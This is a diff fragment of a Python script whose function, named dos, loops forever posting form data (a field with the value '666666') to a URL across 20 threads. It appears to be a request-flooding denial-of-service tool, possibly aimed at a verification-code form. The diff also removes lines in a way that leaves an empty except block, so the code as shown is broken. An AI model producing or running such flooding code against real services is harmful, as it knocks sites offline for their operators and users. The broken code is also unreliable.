@@ -26,10 +26,8 @@ print("")
 def dos(target):
     while True:
         try:
-            res = requests.post(url, data={'3dscode': '666666',})
-            print("")
+            res = requests.post(url, data={'requesting': '666666',})
         except requests.exceptions.ConnectionError:
-            print("")
 
 threads = 20
 
